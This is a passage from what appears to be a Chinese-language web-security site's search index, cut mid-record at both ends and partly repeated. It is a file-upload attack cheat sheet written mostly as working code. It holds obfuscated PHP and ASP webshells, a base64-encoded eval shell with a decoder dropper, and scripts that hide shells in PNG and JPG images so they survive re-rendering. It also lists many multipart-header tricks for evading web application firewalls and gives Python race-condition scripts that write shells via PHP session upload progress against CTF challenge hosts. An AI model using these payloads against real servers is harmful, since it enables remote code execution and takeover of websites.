\u3001jpg\u6587\u4ef6\u5934 FFD8FF \u5371\u9669\u51fd\u6570\u68c0\u6d4b \u00b6 \u4f7f\u7528\u52a8\u6001\u8c03\u7528\u7ed5\u8fc7 <?php $_GET [ '0' ]( $_GET [ '1' ]); ?> \u6b64\u65b9\u6cd5\u4e0d\u80fd\u7ed5\u8fc7disable_function \u8fdb\u9636\u4e00\u70b9\u7684\u811a\u672c\uff1a <?php $poc = \"s#y#s#t#e#m\" ; $poc_1 = explode ( \"#\" , $poc ); $poc_2 = $poc_1 [ 0 ] . $poc_1 [ 1 ] . $poc_1 [ 2 ] . $poc_1 [ 3 ] . $poc_1 [ 4 ] . $poc_1 [ 5 ]; $poc_2 ( $_REQUEST [ '1' ]); ?> \u7136\u540eGET\u4f20\u53c2 1=cat /flag \u5373\u53ef \u4e0a\u4f20\u7f16\u7801\u540e\u7684webshell\u914d\u5408 .htaccess \u6765\u89e3\u6790 \u4e0a\u4f20\u7f16\u7801\u540e\u7684webshell\uff0c\u518d\u53e6\u5916\u4e0a\u4f20\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\u89e3\u7801webshell\u5e76\u5199\u5165\u65b0\u6587\u4ef6 \u4f8b\u5982\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u4e3a1.php PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4= \u4e0a\u4f20\u540e\u518d\u4e0a\u4f20\u4e0b\u9762\u4e3a2.php <?php $path = \"/xx/xxx/xx/1.php\" ; $str = file_get_contents ( $path ); $strs = base64_decode ( $str ); $test = fopen ( \"./test.php\" , \"w\" ); fwrite ( $test , $strs ); fclose ( $test ); ?> \u7136\u540e\u8bbf\u95ee\u540e\u518d\u8bbf\u95eetest.php\u5373\u53efgetshell \u4e8c\u6b21\u6e32\u67d3 \u00b6 \u4e0a\u4f20\u7684\u56fe\u7247\u518d\u4e0b\u8f7d\u53d1\u73b0\u91cc\u9762\u7684\u4e00\u53e5\u8bdd\u6ca1\u4e86\uff0c\u9700\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u811a\u672c\u751f\u6210\u56fe\u7247\u9a6c <?php /*<?$_GET[0]($_POST[1]);?>*/ $p = array ( 0xa3 , 0x9f , 0x67 , 0xf7 , 0x0e , 0x93 , 0x1b , 0x23 , 0xbe , 0x2c , 0x8a , 0xd0 , 0x80 , 0xf9 , 0xe1 , 0xae , 0x22 , 0xf6 , 0xd9 , 0x43 , 0x5d , 0xfb , 0xae , 0xcc , 0x5a , 0x01 , 0xdc , 0x5a , 0x01 , 0xdc , 0xa3 , 0x9f , 0x67 , 0xa5 , 0xbe , 0x5f , 0x76 , 0x74 , 0x5a , 0x4c , 0xa1 , 0x3f , 0x7a , 0xbf , 0x30 , 0x6b , 0x88 , 0x2d , 0x60 , 0x65 , 0x7d , 0x52 , 0x9d , 0xad , 0x88 , 0xa1 , 0x66 , 0x44 , 0x50 , 0x33 ); $img = imagecreatetruecolor ( 32 , 32 ); for ( $y = 0 ; $y < sizeof ( $p ); $y += 3 ) { $r = $p [ $y ]; $g = $p [ $y + 1 ]; $b = $p [ $y + 2 ]; $color = imagecolorallocate ( $img , $r , $g , $b ); imagesetpixel ( $img , round ( $y / 3 ), 0 , $color ); } imagepng ( $img , '1.png' ); \u9700\u8981\u5b89\u88c5php\u7684gd\u5e93\uff0c\u4f7f\u7528\u547d\u4ee4 sudo apt-get install php-gd \u8fdb\u884c\u5b89\u88c5\uff0c\u7136\u540e\u8fd0\u884c php \u56fe\u7247\u4e8c\u6b21\u6e32\u67d3.php \uff0c\u751f\u6210 1.png jpg\u7684\u4e8c\u6b21\u6e32\u67d3\u811a\u672c\u5982\u4e0b\uff1a <?php $miniPayload = '<?=eval($_POST[1]);?>' ; if ( ! extension_loaded ( 'gd' ) || ! function_exists ( 'imagecreatefromjpeg' )) { die ( 'php-gd is not installed' ); } if ( ! isset ( $argv [ 1 ])) { die ( 'php jpg_payload.php <jpg_name.jpg>' ); } set_error_handler ( \"custom_error_handler\" ); for ( $pad = 0 ; $pad < 1024 ; $pad ++ ) { $nullbytePayloadSize = $pad ; $dis = new DataInputStream ( $argv [ 1 ]); $outStream = file_get_contents ( $argv [ 1 ]); $extraBytes = 0 ; $correctImage = TRUE ; if ( $dis -> readShort () != 0xFFD8 ) { die ( 'Incorrect SOI marker' ); } while (( ! $dis -> eof ()) && ( $dis -> readByte () == 0xFF )) { $marker = $dis -> readByte (); $size = $dis -> readShort () - 2 ; $dis -> skip ( $size ); if ( $marker === 0xDA ) { $startPos = $dis -> seek (); $outStreamTmp = substr ( $outStream , 0 , $startPos ) . $miniPayload . str_repeat ( \" \\0 \" , $nullbytePayloadSize ) . substr ( $outStream , $startPos ); checkImage ( '_' . $argv [ 1 ], $outStreamTmp , TRUE ); if ( $extraBytes !== 0 ) { while (( ! $dis -> eof ())) { if ( $dis -> readByte () === 0xFF ) { if ( $dis -> readByte !== 0x00 ) { break ; } } } $stopPos = $dis -> seek () - 2 ; $imageStreamSize = $stopPos - $startPos ; $outStream = substr ( $outStream , 0 , $startPos ) . $miniPayload . substr ( str_repeat ( \" \\0 \" , $nullbytePayloadSize ) . substr ( $outStream , $startPos , $imageStreamSize ), 0 , $nullbytePayloadSize + $imageStreamSize - $extraBytes ) . substr ( $outStream , $stopPos ); } elseif ( $correctImage ) { $outStream = $outStreamTmp ; } else { break ; } if ( checkImage ( 'payload_' . $argv [ 1 ], $outStream )) { die ( 'Success!' ); } else { break ; } } } } unlink ( 'payload_' . $argv [ 1 ]); die ( 'Something\\'s wrong' ); function checkImage ( $filename , $data , $unlink = FALSE ) { global $correctImage ; file_put_contents ( $filename , $data ); $correctImage = TRUE ; imagecreatefromjpeg ( $filename ); if ( $unlink ) unlink ( $filename ); return $correctImage ; } function custom_error_handler ( $errno , $errstr , $errfile , $errline ) { global $extraBytes , $correctImage ; $correctImage = FALSE ; if ( preg_match ( '/(\\d+) extraneous bytes before marker/' , $errstr , $m )) { if ( isset ( $m [ 1 ])) { $extraBytes = ( int ) $m [ 1 ]; } } } class DataInputStream { private $binData ; private $order ; private $size ; public function __construct ( $filename , $order = false , $fromString = false ) { $this -> binData = '' ; $this -> order = $order ; if ( ! $fromString ) { if ( ! file_exists ( $filename ) || ! is_file ( $filename )) die ( 'File not exists [' . $filename . ']' ); $this -> binData = file_get_contents ( $filename ); } else { $this -> binData = $filename ; } $this -> size = strlen ( $this -> binData ); } public function seek () { return ( $this -> size - strlen ( $this -> binData )); } public function skip ( $skip ) { $this -> binData = substr ( $this -> binData , $skip ); } public function readByte () { if ( $this -> eof ()) { die ( 'End Of File' ); } $byte = substr ( $this -> binData , 0 , 1 ); $this -> binData = substr ( $this -> binData , 1 ); return ord ( $byte ); } public function readShort () { if ( strlen ( $this -> binData ) < 2 ) { die ( 'End Of File' ); } $short = substr ( $this -> binData , 0 , 2 ); $this -> binData = substr ( $this -> binData , 2 ); if ( $this -> order ) { $short = ( ord ( $short [ 1 ]) << 8 ) + ord ( $short [ 0 ]); } else { $short = ( ord ( $short [ 0 ]) << 8 ) + ord ( $short [ 1 ]); } return $short ; } public function eof () { return ! $this -> binData || ( strlen ( $this -> binData ) === 0 ); } } ?> \u4e0d\u8fc7jpg\u56fe\u7247\u6210\u529f\u7387\u5f88\u4f4e\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u76f4\u63a5\u4f7f\u7528\u4e0b\u9762\u7684\u539f\u56fe \u8fd0\u884c\u811a\u672c php jpg\u56fe\u7247\u4e8c\u6b21\u6e32\u67d3.php 1.jpg \uff0c\u751f\u6210payload_1.jpg \u7136\u540e\u518d\u4e0a\u4f20payload_1.jpg\uff0cPOST\u4f20\u53c2\u5c31\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\u4e86 WAF\u5c42\u9762 \u00b6 \u53ea\u8981\u80fd\u7ed5\u8fc7WAF\uff0c\u5e76\u4e14\u4f20\u5230\u540e\u7aef\u8fd8\u80fd\u6267\u884c\uff0c\u4e0d\u4f1a500\u5c31\u884c \u4ee3\u7801\u5c42\u9762\u7684\u7ed5\u8fc7\u4f9d\u65e7\u6709\u6548 \u6362\u884c\u7ed5\u8fc7 \u00b6 Content-Disposition: form-data; name=\"file\"; filename=\"1.p hp\" Content-Disposition: form-data; name=\"file\"; file name=\"1.php\" Content-Disposition: form-data; name=\"file\"; filename= \"1.php\" #\u4e09\u79cd\u5747\u53ef \u591a\u4e2a\u7b49\u53f7\u7ed5\u8fc7 \u00b6 Content-Disposition: form-data; name=\"file\"; filename===\"a.php\" \u589e\u5927\u6587\u4ef6\u5927\u5c0f \u00b6 Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=\"file\"; filename=\"a.php\" \u53bb\u6389\u6216\u66ff\u6362\u5f15\u53f7 \u00b6 Content-Disposition: form-data; name=file1; filename=a.php Content-Disposition: form-data; name='file1'; filename=\"a.php\" \u589e\u52a0filename\u5e72\u6270 \u00b6 Content-Disposition: form-data; name=\"file\"; filename= ; filename=\"a.php\" \u6df7\u6dc6waf\u5339\u914d\u5b57\u6bb5 \u00b6 \u6df7\u6dc6form-data Content-Disposition: name=\"file\"; filename=\"a.php\" \u53bb\u9664form-data Content-Disposition: AAAAAAAA=\"BBBBBBBB\"; name=\"file\"; filename=\"a.php\" \u66ff\u6362form-data\u4e3a\u5783\u573e\u503c Content-Disposition: form-data ; name=\"file\"; filename=\"a.php\" form-data\u540e\u52a0\u7a7a\u683c Content-Disposition: for+m-data; name=\"file\"; filename=\"a.php\" form-data\u4e2d\u52a0+ \u6df7\u6dc6ConTent-Disposition COntEnT-DIsposiTiOn: form-data; name=\"file\"; filename=\"a.php\" \u5927\u5c0f\u5199\u6df7\u6dc6 Content-Type: image/gif Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" \u8c03\u6362Content-Type\u548cConTent-Disposition\u7684\u987a\u5e8f Content-Type: image/gif Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" Content-Type: image/gif \u589e\u52a0\u989d\u5916\u7684\u5934 AAAAAAAA:filename=\"aaa.jpg\"; Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" Content-Type: image/gif \u589e\u52a0\u989d\u5916\u7684\u5934 Content-Length: 666 Content-Disposition: form-data; name=\"file\"; filename=\"a.php\" Content-Type: image/gif \u589e\u52a0\u989d\u5916\u7684\u5934 \u53cc\u6587\u4ef6\u7ed5\u8fc7 \u00b6 \u5b89\u5168\u72d7\u603b\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u4e2d\u7684\u503c\u505a\u4e3a\u63a5\u6536\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4e00\u4e9b\u4e2d\u95f4\u4ef6\u4f8b\u5982IIS6.0\u603b\u662f\u4ee5\u7b2c\u4e00\u4e2aContent-Disposition\u4e2d\u7684\u503c\u505a\u4e3a\u63a5\u6536\u53c2\u6570\u3002 \u5bb9\u5668\u4e0eWAF\u5bf9Boundary\u8981\u6c42\u89c4\u5219\u4e0d\u4e00\u81f4 \u00b6 Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99 Content-Length: 253 -----------------------------471****1141173****525****99 Content-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\" Content-Type: application/octet-stream <%eval request(\"a\")%> -----------------------------471****1141173****525****99-- \u4e00\u4e9bWAF\u4f1a\u8ba4\u4e3a\u4e24\u6bb5Boundary\u4e0d\u4e00\u81f4\u7684\u6570\u636e\u662f\u65e0\u610f\u4e49\u7684\uff0c\u4e0d\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u5bb9\u5668\u5e76\u6ca1\u6709\u4e25\u683c\u8981\u6c42\uff0c\u6b63\u5e38\u63a5\u6536\u6570\u636e\u3002 \u6761\u4ef6\u7ade\u4e89 \u00b6 \u4e00\u4e9b\u60c5\u51b5\u4e0b\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u5148\u4e0a\u4f20\u5230\u4e34\u65f6\u76ee\u5f55\uff0c\u7136\u540e\u518d\u68c0\u6d4b\uff0c\u68c0\u6d4b\u5230\u518d\u5220\u9664 \u53ef\u4ee5\u4e0a\u4f20\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c\u7684\u6587\u4ef6\uff1a fputs(fopen('shell6666.php','w'),' <?php @ eval ( $_POST [ 1 ]) ?> '); \u4e0a\u4f20\u540c\u65f6\u75af\u72c2\u91cd\u590d\u53d1\u5305\u8bbf\u95ee\u6b64\u6587\u4ef6\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a\u5728\u6587\u4ef6\u88ab\u5220\u9664\u4e4b\u524d\u751f\u6210webshell\u6587\u4ef6 shell6666.php Session\u7ade\u4e89 \u00b6 session\u6587\u4ef6\u5305\u542b \uff0c\u5148\u4e86\u89e3\u4e00\u4e9b\u77e5\u8bc6\u70b9\uff0c\u5728php5.4\u4e4b\u540ephp.ini\u5f00\u59cb\u6709\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = \u201cupload_progress_\u201d 4.session.upload_progress.name = \u201cPHP_SESSION_UPLOAD_PROGRESS\u201d 5.session.use_strict_mode=off \u7b2c\u4e00\u4e2a\u8868\u793a\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \u7b2c\u4e8c\u4e2a\u8868\u793a\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9 \u7b2c\u4e09\u548c\u7b2c\u56db\u4e2a prefix+name \u5c06\u8868\u793a\u4e3asession\u4e2d\u7684\u952e\u540d \u7b2c\u4e94\u4e2a\u8868\u793a\u6211\u4eec\u5bf9Cookie\u4e2dsessionID\u53ef\u63a7 \u6211\u4eec\u53ef\u4ee5\u5229\u7528 session.upload_progress \u5c06\u6728\u9a6c\u5199\u5165session\u6587\u4ef6\uff0c\u7136\u540e\u5305\u542b\u8fd9\u4e2asession\u6587\u4ef6\u3002\u4e0d\u8fc7\u524d\u63d0\u662f\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2asession\u6587\u4ef6\uff0c\u5e76\u4e14\u77e5\u9053session\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\u3002\u56e0\u4e3a session.use_strict_mode=off \u7684\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49sessionID linux\u7cfb\u7edf\u4e2dsession\u6587\u4ef6\u4e00\u822c\u7684\u9ed8\u8ba4\u5b58\u50a8\u4f4d\u7f6e\u4e3a /tmp \u6216 /var/lib/php/session \u4f8b\u5982\u6211\u4eec\u5728Cookie\u4e2d\u8bbe\u7f6e\u4e86PHPSESSID=flag\uff0cphp\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u6587\u4ef6\uff1a/tmp/sess_flag\uff0c\u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316session\uff0cphp\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u4e3a prefix+name \u7684\u503c\uff0c\u6700\u540e\u88ab\u5199\u5165sess_\u6587\u4ef6\u91cc \u8fd8\u6709\u4e00\u4e2a\u5173\u952e\u70b9\u5c31\u662f session.upload_progress.cleanup \u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u53ea\u8981\u8bfb\u53d6\u4e86post\u6570\u636e\uff0c\u5c31\u4f1a\u6e05\u9664\u8fdb\u5ea6\u4fe1\u606f\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u6761\u4ef6\u7ade\u4e89\u6765pass\uff0c\u5199\u4e00\u4e2a\u811a\u672c\u6765\u5b8c\u6210 import io import requests import threading url = 'http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/' def write ( session ): data = { 'PHP_SESSION_UPLOAD_PROGRESS' : '<?php system(\"tac f*\");?>dotast' } while True : f = io . BytesIO ( b 'a' * 1024 * 10 ) response = session . post ( url , cookies = { 'PHPSESSID' : 'flag' }, data = data , files = { 'file' : ( 'dota.txt' , f )}) def read ( session ): while True : response = session . get ( url + '?file=/tmp/sess_flag' ) if 'dotast' in response . text : print ( response . text ) break else : print ( 'retry' ) if __name__ == '__main__' : session = requests . session () write = threading . Thread ( target = write , args = ( session ,)) write . daemon = True write . start () read ( session ) \u7136\u540e\u6211\u4eec\u8bf4\u5230**session\u6587\u4ef6\u4e0a\u4f20**\uff0c\u8fd8\u662f\u4e00\u6837\u5148\u4e0a\u4f20 .user.ini \uff0c\u5185\u5bb9\u4e3a GIF89a auto_prepend_file = /tmp/sess_muma \u63a5\u7740\u518d\u8fd0\u884c\u811a\u672c\u5373\u53ef import io import requests import threading url = 'http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/' def write ( session ): data = { 'PHP_SESSION_UPLOAD_PROGRESS' : '<?php system(\"tac ../f*\");?>' } while True : f = io . BytesIO ( b 'GIF89a \\n dotast' ) files = { 'file' : ( '1.png' , f , 'image/png' )} response = session . post ( url + \"upload.php\" , cookies = { 'PHPSESSID' : 'muma' }, data = data , files = files ) def read ( session ): while True : response = session . get ( url + 'upload' ) # payload_url = target_url + '?file=' + '/tmp/sess_' + session_id \u7531\u4e8e\u4f20\u4e86.user.ini\u4e86\uff0c\u4e0d\u9700\u8981\u6307\u5b9a\u6240\u9700\u5305\u542b\u7684\u6587\u4ef6\u4e86 if 'ctfshow' in response . text : print ( response . text ) break else : print ( 'retry' ) if __name__ == '__main__' : session = requests . session () for i in range ( 30 ): threading . Thread ( target = write , args = ( session ,)) . start () for i in range ( 30 ): threading . Thread ( target = read , args = ( session ,)) . start ()","title":"\u6587\u4ef6\u4e0a\u4f20\u603b\u7ed3"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_1","text":"","title":"\u4ee3\u7801\u5c42\u9762"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_2","text":"\u7981\u7528\u68c0\u6d4b\u7684js\u4ee3\u7801 \u4e0a\u4f20\u540e\u6293\u5305\u4fee\u6539filename\u53c2\u6570","title":"\u524d\u7aef\u6821\u9a8c\u6587\u4ef6\u540e\u7f00"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#content-type","text":"\u4e0a\u4f20\u65f6\u6293\u5305\u4fee\u6539Content-type\u4e3a image/jpeg","title":"Content-Type\u9650\u5236"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_3","text":"\u5927\u5c0f\u5199\u7ed5\u8fc7 . \u3001 _ \u548c\u7a7a\u683c\u7ed5\u8fc7\uff1a Windows\u7cfb\u7edf\u4e0b \uff0c\u6587\u4ef6\u540d\u540e\u7f00\u6700\u540e\u4e00\u4e2a . \u3001 _ \u548c\u7a7a\u683c\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\uff1b\u5e76\u4e14\u70b9+\u7a7a\u683c+\u70b9\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u7ed5\u8fc7\uff0c\u5982 xxx.php. . ::$DATA \u7ed5\u8fc7\uff1a Windows\u7cfb\u7edf\u4e0b \uff0c\u6587\u4ef6\u540d+ ::$DATA \u4f1a\u628aDATA\u4e4b\u540e\u7684\u6570\u636e\u5f53\u6210\u6587\u4ef6\u6d41\u5904\u7406,\u4e0d\u4f1a\u68c0\u6d4b\u540e\u7f00\u540d\uff0c\u5982 filename=\"test.php::$DATA\" \uff08\u4e00\u4e2a\u5192\u53f7\u4ec5\u521b\u5efa\u4e00\u4e2a\u7a7a\u6587\u4ef6\uff09 \u53cc\u5199\u7ed5\u8fc7\uff1a\u6709\u4e9b\u51fd\u6570\u4f1a\u66ff\u6362\u654f\u611f\u6587\u4ef6\u540d\uff0c\u4f46\u4e0d\u9012\u5f52\u5220\u9664\u7684\u8bdd\u5c31\u53ef\u4ee5\u53cc\u5199\u7ed5\u8fc7\uff0c\u4f8b\u5982 filename=a.phphpp 00\u622a\u65ad\u7ed5\u8fc7\uff1a\u4e0a\u4f20\u65f6\u4e0a\u4f20 a.php.jpg \uff0c\u6293\u5305\u5728php\u540e\u6dfb\u52a0\u4e00\u4e2a\u5b57\u7b26\u4fee\u6539\u5176HEX\u503c\u4e3a00\uff0c\u8fd9\u6837\u89e3\u6790\u4e4b\u540e\u5c31\u662f a.php \u4e86 \u6ee1\u8db3\u6761\u4ef6\uff1aphp\u7248\u672c\u5c0f\u4e8e5.3.4\uff1bphp.ini\u4e2dmagic_quotes_gpc = Off \u6269\u5c55\u540d\u66ff\u6362\uff1a asp/aspx: asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr php : php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml jsp : jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml .htaccess \u548c .user.ini \u7ed5\u8fc7\u9ed1\u540d\u5355\uff1a .htaccess \u53ea\u9002\u7528apache \u2460\u3001Allow Override All \u2461\u3001LoadModule rewrite_module modules/mod_rewrite.so #rewrite\u6a21\u5757\u4e3a\u5f00\u542f\u72b6\u6001 \u4e0a\u4f20 .htaccess \u6587\u4ef6\uff0c\u5199\u5165\uff1a \u65b9\u5f0f\u4e00\uff1aAddType application/x-httpd-php .jpg \u5c06\u6240\u6709\u540e\u7f00\u4e3a.jpg\u7684\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u89e3\u6790 \u65b9\u5f0f\u4e8c\uff1a <FilesMatch \"*.jpg\"> SetHandler application/x-httpd-php #\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u5982\u679c\u5339\u914d\u5230.jpg\u6587\u4ef6\uff0c\u5219\u88ab\u89e3\u6790\u6210PHP\u4ee3\u7801\u6267\u884c AddHandler php5-script .jpg #\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u5982\u679c\u5339\u914d\u5230.jpg\u6587\u4ef6\uff0c\u5219\u88ab\u89e3\u6790\u6210PHP\u4ee3\u7801\u6267\u884c </FilesMatch> .user.ini \u9002\u7528\u4e8e\u670d\u52a1\u5668\u4f7f\u7528CGI\uff0fFastCGI\u6a21\u5f0f\u4e14\u76ee\u5f55\u4e0b\u8981\u6709\u53ef\u6267\u884c\u7684php\u6587\u4ef6 \u4e0a\u4f20 .user.ini \u6587\u4ef6\uff0c\u5199\u5165\uff1a auto_prepend_file = a.jpg a.jpg\u4e2d\u7b26\u5408php\u8bed\u8a00\u7684\u4ee3\u7801\u4f1a\u88ab\u6267\u884c auto_append_file = filename //\u5305\u542b\u5728\u6587\u4ef6\u5c3e \u5728\u6240\u6709php\u6267\u884c\u524d\u90fd\u4f1a\u5148include\u4e0a a.jpg \u8865\u5145\uff1a\u53ef\u4ee5\u8003\u8651\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\uff0c\u7136\u540eUA\u4f20\u4e00\u53e5\u8bdd\u5199\u5165\u65e5\u5fd7 auto_prepend_file = /var/log/nginx/access.log \u914d\u5408\u76ee\u5f55\u89e3\u6790\u6f0f\u6d1e \u67e5\u770b\u54cd\u5e94\u5305Server\u4e2d\u663e\u793aIIS6.0\uff0c\u4fee\u6539\u4e0a\u4f20\u6587\u4ef6\u540d\u4e3a shell.php;jpg \u6216\u8005 shell.php;.jpg \uff0c\u7136\u540e\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u5373\u53ef\uff08\u8bbf\u95ee\u4e5f\u8981\u52a0\u4e0ajpg\uff09 \u76ee\u5f55\u89e3\u6790\u6f0f\u6d1e\uff1a\u4e0a\u4f20\u5230xxx.php\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5c31\u4f1a\u88ab\u89e3\u6790\uff0c\u53ef\u4ee5\u5229\u7528%00\u622a\u65ad\u521b\u5efa\u6587\u4ef6\u5939\uff0c\u7136\u540e\u4e0a\u4f20\u5230\u8be5\u76ee\u5f55\u4e0b \u5229\u7528\u7cfb\u7edf\u7279\u6027 windows+php+iis\u4e2d\uff0c\u4e0a\u4f20 shell.php:.jpg \u4f1a\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684shell.php\uff0c\u7136\u540e\u4e0a\u4f20 shell.<<< \u7684\u6587\u4ef6\u5c31\u53ef\u4ee5\u628a\u4e0a\u4f20\u7684\u5185\u5bb9\u5199\u5165\u6587\u4ef6\u4e86","title":"\u6587\u4ef6\u540e\u7f00\u540d\u68c0\u6d4b"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_4","text":"\u4e0a\u4f20\u56fe\u7247\u9a6c\uff0c\u5728\u4fee\u6539\u540e\u7f00\u4e3a\u53ef\u89e3\u6790\u811a\u672c\u8bed\u8a00\uff1b cmd\u547d\u4ee4 copy 1.png/b+2.php/a 3.png \u5236\u4f5c\u56fe\u7247\u9a6c \u6216\u8005\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\u5728\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6b63\u5e38\u683c\u5f0f\u6587\u4ef6\u5934\u4f8b\u5982\uff1a GIF89a \u3001png\u6587\u4ef6\u5934 89504E47 \u3001jpg\u6587\u4ef6\u5934 FFD8FF","title":"\u6587\u4ef6\u5934\u68c0\u6d4b"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_5","text":"\u4f7f\u7528\u52a8\u6001\u8c03\u7528\u7ed5\u8fc7 <?php $_GET [ '0' ]( $_GET [ '1' ]); ?> \u6b64\u65b9\u6cd5\u4e0d\u80fd\u7ed5\u8fc7disable_function \u8fdb\u9636\u4e00\u70b9\u7684\u811a\u672c\uff1a <?php $poc = \"s#y#s#t#e#m\" ; $poc_1 = explode ( \"#\" , $poc ); $poc_2 = $poc_1 [ 0 ] . $poc_1 [ 1 ] . $poc_1 [ 2 ] . $poc_1 [ 3 ] . $poc_1 [ 4 ] . $poc_1 [ 5 ]; $poc_2 ( $_REQUEST [ '1' ]); ?> \u7136\u540eGET\u4f20\u53c2 1=cat /flag \u5373\u53ef \u4e0a\u4f20\u7f16\u7801\u540e\u7684webshell\u914d\u5408 .htaccess \u6765\u89e3\u6790 \u4e0a\u4f20\u7f16\u7801\u540e\u7684webshell\uff0c\u518d\u53e6\u5916\u4e0a\u4f20\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\u89e3\u7801webshell\u5e76\u5199\u5165\u65b0\u6587\u4ef6 \u4f8b\u5982\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u4e3a1.php PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4= \u4e0a\u4f20\u540e\u518d\u4e0a\u4f20\u4e0b\u9762\u4e3a2.php <?php $path = \"/xx/xxx/xx/1.php\" ; $str = file_get_contents ( $path ); $strs = base64_decode ( $str ); $test = fopen ( \"./test.php\" , \"w\" ); fwrite ( $test , $strs ); fclose ( $test ); ?> \u7136\u540e\u8bbf\u95ee\u540e\u518d\u8bbf\u95eetest.php\u5373\u53efgetshell","title":"\u5371\u9669\u51fd\u6570\u68c0\u6d4b"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/#_6","text":"\u4e0a\u4f20\u7684\u56fe\u7247\u518d\u4e0b\u8f7d\u53d1\u73b0\u91cc\u9762\u7684\u4e00\u53e5\u8bdd\u6ca1\u4e86\uff0c\u9700\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u811a\u672c\u751f\u6210\u56fe\u7247\u9a6c <?php /*<?$_GET[0]($_POST[1]);?>*/ $p = array ( 0xa3 , 0x9f , 0x67 , 0xf7 , 0x0e , 0x93 , 0x1b , 0x23 , 0xbe , 0x2c , 0x8a , 0xd0 , 0x80 , 0xf9 , 0xe1 , 0xae , 0x22 , 0xf6 , 